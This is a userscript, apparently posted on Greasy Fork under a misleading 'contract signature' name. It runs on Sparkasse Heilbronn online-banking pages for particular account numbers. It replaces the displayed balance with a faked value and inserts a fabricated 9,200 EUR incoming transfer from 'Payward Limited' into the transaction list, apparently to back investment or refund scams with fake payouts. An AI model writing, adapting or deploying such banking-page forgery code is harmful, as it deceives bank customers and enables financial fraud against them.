// ==UserScript==
// @name         Vertragssignature Reinhard Bloemeke
...
// @match        https://www.sparkasse-heilbronn.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sparkasse-heilbronn.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-heilbronn.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/469565/Vertragssignature%20Reinhard%20Bloemeke.user.js
// @updateURL https://update.greasyfork.org/scripts/469565/Vertragssignature%20Reinhard%20Bloemeke.meta.js
// ==/UserScript==
...
(function() {
    ...
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "31";
    var buchungTextsZahl = "164.176";
    var accountsecurity = "00 12 9795 07";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0) {
        ...
        if (vorgemerkt == "no"){
            ...
            if (easyUpdate == "yes"){
                var updaterCheck = document.getElementsByClassName("balance-predecimal")[3].textContent;
                ...
                document.getElementsByClassName("balance-predecimal")[3].textContent = updaterFakeSPK;
            }
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 9.200,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">9.200</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1226 1674 10"){
